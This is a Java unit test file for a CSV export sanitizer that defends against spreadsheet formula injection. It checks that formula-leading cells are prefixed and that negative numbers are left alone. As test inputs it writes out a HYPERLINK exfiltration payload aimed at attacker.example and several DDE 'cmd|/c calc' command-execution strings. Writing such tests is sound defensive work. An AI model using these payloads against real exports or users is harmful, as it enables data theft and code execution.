package com.finalexec.api;

import org.junit.jupiter.api.Test;

import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;

/**
 * REG-16-resid Round 6, finding R6-F2 — CSV formula injection in the concept CSV export.
 *
 * <p>RFC 4180 quoting makes a cell <em>parse</em> correctly; it says nothing about what a spreadsheet
 * then <em>does</em> with the value. Excel, LibreOffice and Sheets evaluate any cell whose text starts
 * with {@code = + - @} as a formula.</p>
 *
 * <p><b>The one Round 6 finding that genuinely crosses users.</b> The attacker stores an ordinary
 * field value through the normal API; a different person — typically an admin with wider read scope —
 * exports the concept and opens the file. Nothing in the export path looks abnormal, which is exactly
 * why it survives review.</p>
 */
class CsvExportFormulaInjectionTest {

    @Test
    void aStoredFormulaIsNeutralizedBeforeItReachesTheFile() {
        // The classic exfiltration payload: opening the CSV sends the neighbouring cell to a remote host.
        String payload = "=HYPERLINK(\"http://attacker.example/?d=\"&A1,\"Click me\")";

        String row = CsvCells.toCsvRow(List.of("row-1", payload));

        assertTrue(row.contains("'=HYPERLINK"),
                "a leading '=' must be defused with the spreadsheet's literal-text prefix; got: " + row);
    }

    @Test
    void everyFormulaLeadCharacterIsCovered() {
        // '-' and '+' matter because filters that only check '=' are the common half-fix, and a
        // leading tab or CR is the standard way past a filter that only looks at printable leads.
        for (String lead : new String[]{"=", "+", "-", "@", "\t", "\r"}) {
            String payload = lead + "cmd|'/c calc'!A1";
            assertEquals("'" + payload, CsvCells.neutralizeFormula(payload),
                    "lead character " + lead.codePointAt(0) + " must be neutralized");
        }
    }

    @Test
    void negativeAndSignedNumbersSurviveUntouched() {
        // The reason this is not simply "prefix anything starting with = + - @": a negative number is
        // the single most common export value there is, and corrupting it would break every consumer.
        assertEquals("-42", CsvCells.neutralizeFormula("-42"));
        assertEquals("-42.75", CsvCells.neutralizeFormula("-42.75"));
        assertEquals("+3.14", CsvCells.neutralizeFormula("+3.14"));
        assertEquals("0", CsvCells.neutralizeFormula("0"));
        assertEquals("hello", CsvCells.neutralizeFormula("hello"));
        assertEquals("", CsvCells.neutralizeFormula(""));
    }

    @Test
    void aFormulaDisguisedAsANumberIsStillNeutralized() {
        // The interesting boundary: it STARTS like a negative number, so a naive "is it numeric?"
        // check on the first characters would wave it through.
        assertEquals("'-1+cmd|'/c calc'!A1", CsvCells.neutralizeFormula("-1+cmd|'/c calc'!A1"));
        assertEquals("'-1E2+3", CsvCells.neutralizeFormula("-1E2+3"));
        assertEquals("'-", CsvCells.neutralizeFormula("-"), "a bare sign is not a number");
    }

    @Test
    void neutralizingStillProducesWellFormedRfc4180WhenTheCellAlsoNeedsQuoting() {
        // The two mechanisms compose: the payload contains a comma AND leads with '=', so it must be
        // both prefixed and quoted, in that order.
        String row = CsvCells.toCsvRow(List.of("=SUM(A1,A2)"));
        assertEquals("\"'=SUM(A1,A2)\"\r\n", row);
    }
}
